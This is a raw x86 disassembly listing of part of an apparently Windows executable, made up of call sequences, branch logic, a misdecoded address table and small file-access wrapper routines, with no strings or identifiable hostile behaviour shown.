  402b97:	e8 9e e8 ff ff       	call   0x40143a
  402b9c:	ff 75 50             	push   0x50(%ebp)
  402b9f:	89 55 1c             	mov    %edx,0x1c(%ebp)
  402ba2:	6a 00                	push   $0x0
  402ba4:	50                   	push   %eax
  402ba5:	53                   	push   %ebx
  402ba6:	e8 7c 38 00 00       	call   0x406427
  402bab:	50                   	push   %eax
  402bac:	ff 15 54 91 40 00    	call   *0x409154
  402bb2:	83 7d 48 00          	cmpl   $0x0,0x48(%ebp)
  402bb6:	0f 8c b1 03 00 00    	jl     0x402f6d
  402bbc:	50                   	push   %eax
  402bbd:	ff 75 6c             	push   0x6c(%ebp)
  402bc0:	e9 a0 eb ff ff       	jmp    0x401765
  402bc5:	53                   	push   %ebx
  402bc6:	e8 5c 38 00 00       	call   0x406427
  402bcb:	85 c0                	test   %eax,%eax
  402bcd:	0f 84 9a 03 00 00    	je     0x402f6d
  402bd3:	50                   	push   %eax
  402bd4:	ff 15 58 91 40 00    	call   *0x409158
  402bda:	e9 8e 03 00 00       	jmp    0x402f6d
  402bdf:	ff 75 6c             	push   0x6c(%ebp)
  402be2:	e8 40 38 00 00       	call   0x406427
  402be7:	85 c0                	test   %eax,%eax
  402be9:	0f 84 78 ed ff ff    	je     0x401967
  402bef:	8d 8d 8c fd ff ff    	lea    -0x274(%ebp),%ecx
  402bf5:	51                   	push   %ecx
  402bf6:	50                   	push   %eax
  402bf7:	ff 15 5c 91 40 00    	call   *0x40915c
  402bfd:	85 c0                	test   %eax,%eax
  402bff:	0f 84 62 ed ff ff    	je     0x401967
  402c05:	eb 30                	jmp    0x402c37
  402c07:	6a 02                	push   $0x2
  402c09:	5e                   	pop    %esi
  402c0a:	e8 48 e8 ff ff       	call   0x401457
  402c0f:	8d 8d 8c fd ff ff    	lea    -0x274(%ebp),%ecx
  402c15:	51                   	push   %ecx
  402c16:	50                   	push   %eax
  402c17:	ff 15 60 91 40 00    	call   *0x409160
  402c1d:	83 f8 ff             	cmp    $0xffffffff,%eax
  402c20:	75 0c                	jne    0x402c2e
  402c22:	8b 45 6c             	mov    0x6c(%ebp),%eax
  402c25:	66 83 20 00          	andw   $0x0,(%eax)
  402c29:	e9 02 fd ff ff       	jmp    0x402930
  402c2e:	50                   	push   %eax
  402c2f:	ff 75 6c             	push   0x6c(%ebp)
  402c32:	e8 d7 37 00 00       	call   0x40640e
  402c37:	8d 85 b8 fd ff ff    	lea    -0x248(%ebp),%eax
  402c3d:	50                   	push   %eax
  402c3e:	53                   	push   %ebx
  402c3f:	e8 83 38 00 00       	call   0x4064c7
  402c44:	e9 24 03 00 00       	jmp    0x402f6d
  402c49:	6a f0                	push   $0xfffffff0
  402c4b:	5e                   	pop    %esi
  402c4c:	c7 45 28 66 fd ff ff 	movl   $0xfffffd66,0x28(%ebp)
  402c53:	83 cb ff             	or     $0xffffffff,%ebx
  402c56:	e8 fc e7 ff ff       	call   0x401457
  402c5b:	8b f8                	mov    %eax,%edi
  402c5d:	57                   	push   %edi
  402c5e:	89 7d 68             	mov    %edi,0x68(%ebp)
  402c61:	e8 c9 33 00 00       	call   0x40602f
  402c66:	85 c0                	test   %eax,%eax
  402c68:	75 08                	jne    0x402c72
  402c6a:	6a ec                	push   $0xffffffec
  402c6c:	5e                   	pop    %esi
  402c6d:	e8 e5 e7 ff ff       	call   0x401457
  402c72:	57                   	push   %edi
  402c73:	e8 c3 34 00 00       	call   0x40613b
  402c78:	6a 02                	push   $0x2
  402c7a:	68 00 00 00 40       	push   $0x40000000
  402c7f:	57                   	push   %edi
  402c80:	e8 dc 34 00 00       	call   0x406161
  402c85:	33 ff                	xor    %edi,%edi
  402c87:	3b c3                	cmp    %ebx,%eax
  402c89:	89 45 7c             	mov    %eax,0x7c(%ebp)
  402c8c:	0f 84 e2 00 00 00    	je     0x402d74
  402c92:	39 7d 50             	cmp    %edi,0x50(%ebp)
  402c95:	8b 45 48             	mov    0x48(%ebp),%eax
  402c98:	89 45 38             	mov    %eax,0x38(%ebp)
  402c9b:	8b 45 4c             	mov    0x4c(%ebp),%eax
  402c9e:	89 45 3c             	mov    %eax,0x3c(%ebp)
  402ca1:	0f 84 9f 00 00 00    	je     0x402d46
  402ca7:	a1 f4 a5 42 00       	mov    0x42a5f4,%eax
  402cac:	8b 35 2c 91 40 00    	mov    0x40912c,%esi
  402cb2:	50                   	push   %eax
  402cb3:	6a 40                	push   $0x40
  402cb5:	89 45 1c             	mov    %eax,0x1c(%ebp)
  402cb8:	ff d6                	call   *%esi
  402cba:	8b d8                	mov    %eax,%ebx
  402cbc:	3b df                	cmp    %edi,%ebx
  402cbe:	0f 84 82 00 00 00    	je     0x402d46
  402cc4:	57                   	push   %edi
  402cc5:	e8 83 05 00 00       	call   0x40324d
  402cca:	ff 75 1c             	push   0x1c(%ebp)
  402ccd:	53                   	push   %ebx
  402cce:	e8 1e 05 00 00       	call   0x4031f1
  402cd3:	ff 75 50             	push   0x50(%ebp)
  402cd6:	6a 40                	push   $0x40
  402cd8:	ff d6                	call   *%esi
  402cda:	8b f0                	mov    %eax,%esi
  402cdc:	3b f7                	cmp    %edi,%esi
  402cde:	89 75 34             	mov    %esi,0x34(%ebp)
  402ce1:	74 48                	je     0x402d2b
  402ce3:	39 3d e0 a5 42 00    	cmp    %edi,0x42a5e0
  402ce9:	ff 75 58             	push   0x58(%ebp)
  402cec:	ff 75 50             	push   0x50(%ebp)
  402cef:	56                   	push   %esi
  402cf0:	57                   	push   %edi
  402cf1:	ff 75 3c             	push   0x3c(%ebp)
  402cf4:	ff 75 38             	push   0x38(%ebp)
  402cf7:	74 04                	je     0x402cfd
  402cf9:	6a 01                	push   $0x1
  402cfb:	eb 01                	jmp    0x402cfe
  402cfd:	57                   	push   %edi
  402cfe:	e8 1d 06 00 00       	call   0x403320
  402d03:	eb 18                	jmp    0x402d1d
  402d05:	8b 0e                	mov    (%esi),%ecx
  402d07:	8b 46 04             	mov    0x4(%esi),%eax
  402d0a:	51                   	push   %ecx
  402d0b:	83 c6 08             	add    $0x8,%esi
  402d0e:	56                   	push   %esi
  402d0f:	03 c3                	add    %ebx,%eax
  402d11:	50                   	push   %eax
  402d12:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  402d15:	e8 fd 33 00 00       	call   0x406117
  402d1a:	03 75 dc             	add    -0x24(%ebp),%esi
  402d1d:	80 3e 00             	cmpb   $0x0,(%esi)
  402d20:	75 e3                	jne    0x402d05
  402d22:	ff 75 34             	push   0x34(%ebp)
  402d25:	ff 15 30 91 40 00    	call   *0x409130
  402d2b:	ff 75 1c             	push   0x1c(%ebp)
  402d2e:	53                   	push   %ebx
  402d2f:	ff 75 7c             	push   0x7c(%ebp)
  402d32:	e8 dc 34 00 00       	call   0x406213
  402d37:	53                   	push   %ebx
  402d38:	ff 15 30 91 40 00    	call   *0x409130
  402d3e:	83 4d 38 ff          	orl    $0xffffffff,0x38(%ebp)
  402d42:	83 4d 3c ff          	orl    $0xffffffff,0x3c(%ebp)
  402d46:	39 3d e0 a5 42 00    	cmp    %edi,0x42a5e0
  402d4c:	ff 75 5c             	push   0x5c(%ebp)
  402d4f:	57                   	push   %edi
  402d50:	57                   	push   %edi
  402d51:	ff 75 7c             	push   0x7c(%ebp)
  402d54:	ff 75 3c             	push   0x3c(%ebp)
  402d57:	ff 75 38             	push   0x38(%ebp)
  402d5a:	74 04                	je     0x402d60
  402d5c:	6a 01                	push   $0x1
  402d5e:	eb 01                	jmp    0x402d61
  402d60:	57                   	push   %edi
  402d61:	e8 ba 05 00 00       	call   0x403320
  402d66:	ff 75 7c             	push   0x7c(%ebp)
  402d69:	8b da                	mov    %edx,%ebx
  402d6b:	89 45 28             	mov    %eax,0x28(%ebp)
  402d6e:	ff 15 1c 91 40 00    	call   *0x40911c
  402d74:	3b df                	cmp    %edi,%ebx
  402d76:	6a f3                	push   $0xfffffff3
  402d78:	5e                   	pop    %esi
  402d79:	7f 1a                	jg     0x402d95
  402d7b:	7c 05                	jl     0x402d82
  402d7d:	39 7d 28             	cmp    %edi,0x28(%ebp)
  402d80:	73 13                	jae    0x402d95
  402d82:	6a ef                	push   $0xffffffef
  402d84:	5e                   	pop    %esi
  402d85:	ff 75 68             	push   0x68(%ebp)
  402d88:	ff 15 64 91 40 00    	call   *0x409164
  402d8e:	c7 45 70 01 00 00 00 	movl   $0x1,0x70(%ebp)
  402d95:	56                   	push   %esi
  402d96:	e9 c7 ea ff ff       	jmp    0x401862
  402d9b:	33 c9                	xor    %ecx,%ecx
  402d9d:	e8 98 e6 ff ff       	call   0x40143a
  402da2:	8b f8                	mov    %eax,%edi
  402da4:	3b 3d ac a5 42 00    	cmp    0x42a5ac,%edi
  402daa:	89 55 1c             	mov    %edx,0x1c(%ebp)
  402dad:	0f 83 06 ea ff ff    	jae    0x4017b9
  402db3:	8b 45 4c             	mov    0x4c(%ebp),%eax
  402db6:	8b f7                	mov    %edi,%esi
  402db8:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  402dbe:	03 35 a8 a5 42 00    	add    0x42a5a8,%esi
  402dc4:	85 c0                	test   %eax,%eax
  402dc6:	7c 17                	jl     0x402ddf
  402dc8:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  402dcb:	75 0c                	jne    0x402dd9
  402dcd:	83 c6 18             	add    $0x18,%esi
  402dd0:	56                   	push   %esi
  402dd1:	ff 75 6c             	push   0x6c(%ebp)
  402dd4:	e9 66 fe ff ff       	jmp    0x402c3f
  402dd9:	51                   	push   %ecx
  402dda:	e9 de fd ff ff       	jmp    0x402bbd
  402ddf:	83 c9 ff             	or     $0xffffffff,%ecx
  402de2:	2b c8                	sub    %eax,%ecx
  402de4:	89 4d 4c             	mov    %ecx,0x4c(%ebp)
  402de7:	74 10                	je     0x402df9
  402de9:	33 c9                	xor    %ecx,%ecx
  402deb:	41                   	inc    %ecx
  402dec:	e8 49 e6 ff ff       	call   0x40143a
  402df1:	89 55 1c             	mov    %edx,0x1c(%ebp)
  402df4:	89 45 48             	mov    %eax,0x48(%ebp)
  402df7:	eb 13                	jmp    0x402e0c
  402df9:	ff 75 54             	push   0x54(%ebp)
  402dfc:	8d 46 18             	lea    0x18(%esi),%eax
  402dff:	50                   	push   %eax
  402e00:	e8 dc 3a 00 00       	call   0x4068e1
  402e05:	81 4e 08 00 01 00 00 	orl    $0x100,0x8(%esi)
  402e0c:	8b 45 4c             	mov    0x4c(%ebp),%eax
  402e0f:	8b 4d 48             	mov    0x48(%ebp),%ecx
  402e12:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  402e15:	83 7d 50 00          	cmpl   $0x0,0x50(%ebp)
  402e19:	0f 84 4e 01 00 00    	je     0x402f6d
  402e1f:	57                   	push   %edi
  402e20:	e8 58 e3 ff ff       	call   0x40117d
  402e25:	e9 43 01 00 00       	jmp    0x402f6d
  402e2a:	33 c9                	xor    %ecx,%ecx
  402e2c:	e8 09 e6 ff ff       	call   0x40143a
  402e31:	83 f8 20             	cmp    $0x20,%eax
  402e34:	89 55 1c             	mov    %edx,0x1c(%ebp)
  402e37:	0f 83 7c e9 ff ff    	jae    0x4017b9
  402e3d:	33 f6                	xor    %esi,%esi
  402e3f:	39 75 50             	cmp    %esi,0x50(%ebp)
  402e42:	74 22                	je     0x402e66
  402e44:	39 75 4c             	cmp    %esi,0x4c(%ebp)
  402e47:	74 12                	je     0x402e5b
  402e49:	50                   	push   %eax
  402e4a:	e8 4e e4 ff ff       	call   0x40129d
  402e4f:	56                   	push   %esi
  402e50:	56                   	push   %esi
  402e51:	e8 99 e3 ff ff       	call   0x4011ef
  402e56:	e9 12 01 00 00       	jmp    0x402f6d
  402e5b:	56                   	push   %esi
  402e5c:	e8 87 e4 ff ff       	call   0x4012e8
  402e61:	e9 56 fd ff ff       	jmp    0x402bbc
  402e66:	39 75 4c             	cmp    %esi,0x4c(%ebp)
  402e69:	74 15                	je     0x402e80
  402e6b:	8b 4d 48             	mov    0x48(%ebp),%ecx
  402e6e:	8b 15 8c a5 42 00    	mov    0x42a58c,%edx
  402e74:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  402e7b:	e9 ed 00 00 00       	jmp    0x402f6d
  402e80:	8b 0d 8c a5 42 00    	mov    0x42a58c,%ecx
  402e86:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  402e8d:	ff 75 6c             	push   0x6c(%ebp)
  402e90:	e8 4c 3a 00 00       	call   0x4068e1
  402e95:	e9 d3 00 00 00       	jmp    0x402f6d
  402e9a:	8b 45 50             	mov    0x50(%ebp),%eax
  402e9d:	83 e8 00             	sub    $0x0,%eax
  402ea0:	74 47                	je     0x402ee9
  402ea2:	48                   	dec    %eax
  402ea3:	0f 85 c4 00 00 00    	jne    0x402f6d
  402ea9:	6a 02                	push   $0x2
  402eab:	59                   	pop    %ecx
  402eac:	e8 89 e5 ff ff       	call   0x40143a
  402eb1:	6a 04                	push   $0x4
  402eb3:	59                   	pop    %ecx
  402eb4:	8b f0                	mov    %eax,%esi
  402eb6:	89 55 1c             	mov    %edx,0x1c(%ebp)
  402eb9:	e8 7c e5 ff ff       	call   0x40143a
  402ebe:	83 65 7c 00          	andl   $0x0,0x7c(%ebp)
  402ec2:	0f b6 c8             	movzbl %al,%ecx
  402ec5:	c1 e8 18             	shr    $0x18,%eax
  402ec8:	85 f6                	test   %esi,%esi
  402eca:	89 55 1c             	mov    %edx,0x1c(%ebp)
  402ecd:	75 05                	jne    0x402ed4
  402ecf:	be 40 a6 42 00       	mov    $0x42a640,%esi
  402ed4:	51                   	push   %ecx
  402ed5:	03 c6                	add    %esi,%eax
  402ed7:	50                   	push   %eax
  402ed8:	8d 45 7c             	lea    0x7c(%ebp),%eax
  402edb:	50                   	push   %eax
  402edc:	e8 36 32 00 00       	call   0x406117
  402ee1:	ff 75 7c             	push   0x7c(%ebp)
  402ee4:	e9 d4 fc ff ff       	jmp    0x402bbd
  402ee9:	6a 06                	push   $0x6
  402eeb:	e8 5a 37 00 00       	call   0x40664a
  402ef0:	6a 22                	push   $0x22
  402ef2:	5e                   	pop    %esi
  402ef3:	8b f8                	mov    %eax,%edi
  402ef5:	e8 5d e5 ff ff       	call   0x401457
  402efa:	85 ff                	test   %edi,%edi
  402efc:	74 38                	je     0x402f36
  402efe:	8d 4d 10             	lea    0x10(%ebp),%ecx
  402f01:	51                   	push   %ecx
  402f02:	50                   	push   %eax
  402f03:	ff 15 bc 92 40 00    	call   *0x4092bc
  402f09:	85 c0                	test   %eax,%eax
  402f0b:	7c 29                	jl     0x402f36
  402f0d:	8d 45 7c             	lea    0x7c(%ebp),%eax
  402f10:	50                   	push   %eax
  402f11:	6a 00                	push   $0x0
  402f13:	ff 75 50             	push   0x50(%ebp)
  402f16:	8d 45 10             	lea    0x10(%ebp),%eax
  402f19:	50                   	push   %eax
  402f1a:	ff d7                	call   *%edi
  402f1c:	85 c0                	test   %eax,%eax
  402f1e:	7c 16                	jl     0x402f36
  402f20:	ff 75 7c             	push   0x7c(%ebp)
  402f23:	ff 75 6c             	push   0x6c(%ebp)
  402f26:	e8 9c 35 00 00       	call   0x4064c7
  402f2b:	ff 75 7c             	push   0x7c(%ebp)
  402f2e:	ff 15 c0 92 40 00    	call   *0x4092c0
  402f34:	eb 37                	jmp    0x402f6d
  402f36:	8b 45 6c             	mov    0x6c(%ebp),%eax
  402f39:	66 83 20 00          	andw   $0x0,(%eax)
  402f3d:	c7 45 70 01 00 00 00 	movl   $0x1,0x70(%ebp)
  402f44:	eb 27                	jmp    0x402f6d
  402f46:	8b 0d 10 5a 42 00    	mov    0x425a10,%ecx
  402f4c:	6a 00                	push   $0x0
  402f4e:	23 c8                	and    %eax,%ecx
  402f50:	51                   	push   %ecx
  402f51:	6a 0b                	push   $0xb
  402f53:	52                   	push   %edx
  402f54:	ff 15 78 92 40 00    	call   *0x409278
  402f5a:	83 7d 44 00          	cmpl   $0x0,0x44(%ebp)
  402f5e:	74 0d                	je     0x402f6d
  402f60:	6a 00                	push   $0x0
  402f62:	6a 00                	push   $0x0
  402f64:	ff 75 64             	push   0x64(%ebp)
  402f67:	ff 15 74 92 40 00    	call   *0x409274
  402f6d:	8b 45 70             	mov    0x70(%ebp),%eax
  402f70:	01 05 48 a6 42 00    	add    %eax,0x42a648
  402f76:	33 c0                	xor    %eax,%eax
  402f78:	5f                   	pop    %edi
  402f79:	5e                   	pop    %esi
  402f7a:	5b                   	pop    %ebx
  402f7b:	83 c5 74             	add    $0x74,%ebp
  402f7e:	c9                   	leave
  402f7f:	c2 04 00             	ret    $0x4
  402f82:	90                   	nop
  402f83:	78 2f                	js     0x402fb4
  402f85:	40                   	inc    %eax
  402f86:	00 62 16             	add    %ah,0x16(%edx)
  402f89:	40                   	inc    %eax
  402f8a:	00 74 16 40          	add    %dh,0x40(%esi,%edx,1)
  402f8e:	00 88 16 40 00 9c    	add    %cl,-0x63ffbfea(%eax)
  402f94:	16                   	push   %ss
  402f95:	40                   	inc    %eax
  402f96:	00 a9 16 40 00 c7    	add    %ch,-0x38ffbfea(%ecx)
  402f9c:	16                   	push   %ss
  402f9d:	40                   	inc    %eax
  402f9e:	00 6f 17             	add    %ch,0x17(%edi)
  402fa1:	40                   	inc    %eax
  402fa2:	00 9f 17 40 00 c5    	add    %bl,-0x3affbfe9(%edi)
  402fa8:	17                   	pop    %ss
  402fa9:	40                   	inc    %eax
  402faa:	00 6c 18 40          	add    %ch,0x40(%eax,%ebx,1)
  402fae:	00 d3                	add    %dl,%bl
  402fb0:	16                   	push   %ss
  402fb1:	40                   	inc    %eax
  402fb2:	00 39                	add    %bh,(%ecx)
  402fb4:	17                   	pop    %ss
  402fb5:	40                   	inc    %eax
  402fb6:	00 5a 17             	add    %bl,0x17(%edx)
  402fb9:	40                   	inc    %eax
  402fba:	00 89 18 40 00 d8    	add    %cl,-0x27ffbfe8(%ecx)
  402fc0:	18 40 00             	sbb    %al,0x0(%eax)
  402fc3:	42                   	inc    %edx
  402fc4:	19 40 00             	sbb    %eax,0x0(%eax)
  402fc7:	77 19                	ja     0x402fe2
  402fc9:	40                   	inc    %eax
  402fca:	00 8b 19 40 00 8b    	add    %cl,-0x74ffbfe7(%ebx)
  402fd0:	19 40 00             	sbb    %eax,0x0(%eax)
  402fd3:	52                   	push   %edx
  402fd4:	1b 40 00             	sbb    0x0(%eax),%eax
  402fd7:	e2 1b                	loop   0x402ff4
  402fd9:	40                   	inc    %eax
  402fda:	00 f7                	add    %dh,%bh
  402fdc:	1b 40 00             	sbb    0x0(%eax),%eax
  402fdf:	2e 1c 40             	cs sbb $0x40,%al
  402fe2:	00 33                	add    %dh,(%ebx)
  402fe4:	1c 40                	sbb    $0x40,%al
  402fe6:	00 47 1c             	add    %al,0x1c(%edi)
  402fe9:	40                   	inc    %eax
  402fea:	00 d6                	add    %dl,%dh
  402fec:	1c 40                	sbb    $0x40,%al
  402fee:	00 0e                	add    %cl,(%esi)
  402ff0:	1d 40 00 4f 1d       	sbb    $0x1d4f0040,%eax
  402ff5:	40                   	inc    %eax
  402ff6:	00 8f 1d 40 00 26    	add    %cl,0x2600401d(%edi)
  402ffc:	1e                   	push   %ds
  402ffd:	40                   	inc    %eax
  402ffe:	00 4c 1e 40          	add    %cl,0x40(%esi,%ebx,1)
  403002:	00 fb                	add    %bh,%bl
  403004:	1e                   	push   %ds
  403005:	40                   	inc    %eax
  403006:	00 fb                	add    %bh,%bl
  403008:	1e                   	push   %ds
  403009:	40                   	inc    %eax
  40300a:	00 d7                	add    %dl,%bh
  40300c:	1f                   	pop    %ds
  40300d:	40                   	inc    %eax
  40300e:	00 ed                	add    %ch,%ch
  403010:	1f                   	pop    %ds
  403011:	40                   	inc    %eax
  403012:	00 12                	add    %dl,(%edx)
  403014:	20 40 00             	and    %al,0x0(%eax)
  403017:	36 20 40 00          	and    %al,%ss:0x0(%eax)
  40301b:	03 21                	add    (%ecx),%esp
  40301d:	40                   	inc    %eax
  40301e:	00 91 21 40 00 c6    	add    %dl,-0x39ffbfdf(%ecx)
  403024:	21 40 00             	and    %eax,0x0(%eax)
  403027:	5d                   	pop    %ebp
  403028:	22 40 00             	and    0x0(%eax),%al
  40302b:	a9 22 40 00 e0       	test   $0xe0004022,%eax
  403030:	22 40 00             	and    0x0(%eax),%al
  403033:	95                   	xchg   %eax,%ebp
  403034:	23 40 00             	and    0x0(%eax),%eax
  403037:	68 24 40 00 be       	push   $0xbe004024
  40303c:	25 40 00 45 26       	and    $0x26450040,%eax
  403041:	40                   	inc    %eax
  403042:	00 5b 26             	add    %bl,0x26(%ebx)
  403045:	40                   	inc    %eax
  403046:	00 a7 26 40 00 e9    	add    %ah,-0x16ffbfda(%edi)
  40304c:	26 40                	es inc %eax
  40304e:	00 44 27 40          	add    %al,0x40(%edi,%eiz,1)
  403052:	00 1d 28 40 00 a1    	add    %bl,0xa1004028
  403058:	28 40 00             	sub    %al,0x0(%eax)
  40305b:	ff 28                	ljmp   *(%eax)
  40305d:	40                   	inc    %eax
  40305e:	00 13                	add    %dl,(%ebx)
  403060:	29 40 00             	sub    %eax,0x0(%eax)
  403063:	39 29                	cmp    %ebp,(%ecx)
  403065:	40                   	inc    %eax
  403066:	00 e7                	add    %ah,%bh
  403068:	29 40 00             	sub    %eax,0x0(%eax)
  40306b:	8a 2b                	mov    (%ebx),%ch
  40306d:	40                   	inc    %eax
  40306e:	00 c5                	add    %al,%ch
  403070:	2b 40 00             	sub    0x0(%eax),%eax
  403073:	df 2b                	fildll (%ebx)
  403075:	40                   	inc    %eax
  403076:	00 07                	add    %al,(%edi)
  403078:	2c 40                	sub    $0x40,%al
  40307a:	00 49 2c             	add    %cl,0x2c(%ecx)
  40307d:	40                   	inc    %eax
  40307e:	00 9b 2d 40 00 2a    	add    %bl,0x2a00402d(%ebx)
  403084:	2e 40                	cs inc %eax
  403086:	00 9a 2e 40 00 6d    	add    %bl,0x6d00402e(%edx)
  40308c:	2f                   	das
  40308d:	40                   	inc    %eax
  40308e:	00 46 2f             	add    %al,0x2f(%esi)
  403091:	40                   	inc    %eax
  403092:	00 39                	add    %bh,(%ecx)
  403094:	29 40 00             	sub    %eax,0x0(%eax)
  403097:	e7 29                	out    %eax,$0x29
  403099:	40                   	inc    %eax
  40309a:	00 b8 1d 40 00 bc    	add    %bh,-0x43ffbfe3(%eax)
  4030a0:	1d 40 00 c0 1d       	sbb    $0x1dc00040,%eax
  4030a5:	40                   	inc    %eax
  4030a6:	00 c7                	add    %al,%bh
  4030a8:	1d 40 00 dd 1d       	sbb    $0x1ddd0040,%eax
  4030ad:	40                   	inc    %eax
  4030ae:	00 e1                	add    %ah,%cl
  4030b0:	1d 40 00 e5 1d       	sbb    $0x1de50040,%eax
  4030b5:	40                   	inc    %eax
  4030b6:	00 e9                	add    %ch,%cl
  4030b8:	1d 40 00 f4 1d       	sbb    $0x1df40040,%eax
  4030bd:	40                   	inc    %eax
  4030be:	00 01                	add    %al,(%ecx)
  4030c0:	1e                   	push   %ds
  4030c1:	40                   	inc    %eax
  4030c2:	00 09                	add    %cl,(%ecx)
  4030c4:	1e                   	push   %ds
  4030c5:	40                   	inc    %eax
  4030c6:	00 16                	add    %dl,(%esi)
  4030c8:	1e                   	push   %ds
  4030c9:	40                   	inc    %eax
  4030ca:	00 1a                	add    %bl,(%edx)
  4030cc:	1e                   	push   %ds
  4030cd:	40                   	inc    %eax
  4030ce:	00 1e                	add    %bl,(%esi)
  4030d0:	1e                   	push   %ds
  4030d1:	40                   	inc    %eax
  4030d2:	00 a1 d4 19 42 00    	add    %ah,0x4219d4(%ecx)
  4030d8:	85 c0                	test   %eax,%eax
  4030da:	74 21                	je     0x4030fd
  4030dc:	0f b6 0d d3 19 42 00 	movzbl 0x4219d3,%ecx
  4030e3:	0f b6 15 cb 19 42 00 	movzbl 0x4219cb,%edx
  4030ea:	c1 e0 08             	shl    $0x8,%eax
  4030ed:	0b c1                	or     %ecx,%eax
  4030ef:	8b c8                	mov    %eax,%ecx
  4030f1:	a1 cc 19 42 00       	mov    0x4219cc,%eax
  4030f6:	c1 e0 08             	shl    $0x8,%eax
  4030f9:	0b c2                	or     %edx,%eax
  4030fb:	eb 0b                	jmp    0x403108
  4030fd:	8b 0d d0 19 42 00    	mov    0x4219d0,%ecx
  403103:	a1 c8 19 42 00       	mov    0x4219c8,%eax
  403108:	d1 e8                	shr    $1,%eax
  40310a:	d1 e9                	shr    $1,%ecx
  40310c:	3b c1                	cmp    %ecx,%eax
  40310e:	72 02                	jb     0x403112
  403110:	8b c1                	mov    %ecx,%eax
  403112:	51                   	push   %ecx
  403113:	6a 64                	push   $0x64
  403115:	50                   	push   %eax
  403116:	ff 15 68 91 40 00    	call   *0x409168
  40311c:	c3                   	ret
  40311d:	55                   	push   %ebp
  40311e:	8b ec                	mov    %esp,%ebp
  403120:	81 ec 80 00 00 00    	sub    $0x80,%esp
  403126:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  40312d:	75 19                	jne    0x403148
  40312f:	6a 00                	push   $0x0
  403131:	68 fa 00 00 00       	push   $0xfa
  403136:	6a 01                	push   $0x1
  403138:	ff 75 08             	push   0x8(%ebp)
  40313b:	ff 15 38 92 40 00    	call   *0x409238
  403141:	c7 45 0c 13 01 00 00 	movl   $0x113,0xc(%ebp)
  403148:	81 7d 0c 13 01 00 00 	cmpl   $0x113,0xc(%ebp)
  40314f:	75 36                	jne    0x403187
  403151:	e8 7d ff ff ff       	call   0x4030d3
  403156:	50                   	push   %eax
  403157:	8d 45 80             	lea    -0x80(%ebp),%eax
  40315a:	68 e4 92 40 00       	push   $0x4092e4
  40315f:	50                   	push   %eax
  403160:	ff 15 4c 92 40 00    	call   *0x40924c
  403166:	83 c4 0c             	add    $0xc,%esp
  403169:	8d 45 80             	lea    -0x80(%ebp),%eax
  40316c:	50                   	push   %eax
  40316d:	ff 75 08             	push   0x8(%ebp)
  403170:	ff 15 3c 92 40 00    	call   *0x40923c
  403176:	8d 45 80             	lea    -0x80(%ebp),%eax
  403179:	50                   	push   %eax
  40317a:	68 06 04 00 00       	push   $0x406
  40317f:	ff 75 08             	push   0x8(%ebp)
  403182:	e8 03 2e 00 00       	call   0x405f8a
  403187:	33 c0                	xor    %eax,%eax
  403189:	c9                   	leave
  40318a:	c2 10 00             	ret    $0x10
  40318d:	56                   	push   %esi
  40318e:	33 f6                	xor    %esi,%esi
  403190:	39 74 24 08          	cmp    %esi,0x8(%esp)
  403194:	74 18                	je     0x4031ae
  403196:	a1 70 99 41 00       	mov    0x419970,%eax
  40319b:	3b c6                	cmp    %esi,%eax
  40319d:	74 07                	je     0x4031a6
  40319f:	50                   	push   %eax
  4031a0:	ff 15 30 92 40 00    	call   *0x409230
  4031a6:	89 35 70 99 41 00    	mov    %esi,0x419970
  4031ac:	5e                   	pop    %esi
  4031ad:	c3                   	ret
  4031ae:	39 35 70 99 41 00    	cmp    %esi,0x419970
  4031b4:	74 08                	je     0x4031be
  4031b6:	56                   	push   %esi
  4031b7:	e8 c8 34 00 00       	call   0x406684
  4031bc:	5e                   	pop    %esi
  4031bd:	c3                   	ret
  4031be:	ff 15 f0 90 40 00    	call   *0x4090f0
  4031c4:	3b 05 e4 a5 42 00    	cmp    0x42a5e4,%eax
  4031ca:	76 23                	jbe    0x4031ef
  4031cc:	56                   	push   %esi
  4031cd:	68 1d 31 40 00       	push   $0x40311d
  4031d2:	56                   	push   %esi
  4031d3:	6a 6f                	push   $0x6f
  4031d5:	ff 35 88 a5 42 00    	push   0x42a588
  4031db:	ff 15 34 92 40 00    	call   *0x409234
  4031e1:	6a 05                	push   $0x5
  4031e3:	50                   	push   %eax
  4031e4:	a3 70 99 41 00       	mov    %eax,0x419970
  4031e9:	ff 15 48 92 40 00    	call   *0x409248
  4031ef:	5e                   	pop    %esi
  4031f0:	c3                   	ret
  4031f1:	ff 74 24 08          	push   0x8(%esp)
  4031f5:	ff 74 24 08          	push   0x8(%esp)
  4031f9:	ff 35 10 b0 40 00    	push   0x40b010
  4031ff:	e8 e0 2f 00 00       	call   0x4061e4
  403204:	c2 08 00             	ret    $0x8
  403207:	55                   	push   %ebp
  403208:	8b ec                	mov    %esp,%ebp
  40320a:	51                   	push   %ecx
  40320b:	51                   	push   %ecx
  40320c:	8b 4d 10             	mov    0x10(%ebp),%ecx
  40320f:	ff 75 14             	push   0x14(%ebp)
  403212:	8b 45 0c             	mov    0xc(%ebp),%eax
  403215:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  403218:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  40321b:	51                   	push   %ecx
  40321c:	50                   	push   %eax
  40321d:	ff 75 08             	push   0x8(%ebp)
  403220:	89 45 f8             	mov    %eax,-0x8(%ebp)
  403223:	ff 15 54 91 40 00    	call   *0x409154
  403229:	83 f8 ff             	cmp    $0xffffffff,%eax
  40322c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  40322f:	75 12                	jne    0x403243
  403231:	ff 15 ec 90 40 00    	call   *0x4090ec
  403237:	85 c0                	test   %eax,%eax
  403239:	74 08                	je     0x403243
  40323b:	83 4d f8 ff          	orl    $0xffffffff,-0x8(%ebp)
  40323f:	83 4d fc ff          	orl    $0xffffffff,-0x4(%ebp)
  403243:	8b 45 f8             	mov    -0x8(%ebp),%eax
  403246:	8b 55 fc             	mov    -0x4(%ebp),%edx
  403249:	c9                   	leave
  40324a:	c2 10 00             	ret    $0x10
  40324d:	8b 44 24 04          	mov    0x4(%esp),%eax
  403251:	6a 00                	push   $0x0
  403253:	99                   	cltd
  403254:	52                   	push   %edx
  403255:	50                   	push   %eax
  403256:	ff 35 10 b0 40 00    	push   0x40b010
